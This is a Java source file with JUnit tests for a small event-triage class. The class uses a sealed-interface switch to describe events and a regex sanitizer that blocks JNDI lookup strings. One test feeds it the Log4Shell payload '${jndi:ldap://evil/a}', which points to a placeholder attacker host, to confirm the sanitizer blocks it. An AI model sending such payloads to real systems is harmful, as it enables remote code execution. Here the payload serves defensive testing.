import java.util.regex.*;
import static org.junit.jupiter.api.Assertions.*;
import org.junit.jupiter.api.Test;

sealed interface Event permits Login, Breach, Logout {}
record Login(String user) implements Event {}
record Breach(int severity) implements Event {}
record Logout(String user) implements Event {}

class Triage {
    private static final Pattern JNDI = Pattern.compile("\\$\\{\\s*jndi:", Pattern.CASE_INSENSITIVE);

    static String describe(Event e) {
        return switch (e) {
            case Login l -> l.user() + " in";
            case Breach b when b.severity() >= 8 -> "CRITICAL breach";
            case Breach b -> "breach " + b.severity();
            case Logout o -> o.user() + " out";
        };
    }

    static String sanitize(String input) {
        return JNDI.matcher(input).find() ? "[BLOCKED]" : input;
    }
}

class TriageTest {
    @Test
    void describesCriticalBreach() {
        assertEquals("CRITICAL breach", Triage.describe(new Breach(9)));
    }

    @Test
    void blocksLog4Shell() {
        assertEquals("[BLOCKED]", Triage.sanitize("${jndi:ldap://evil/a}"));
    }
}
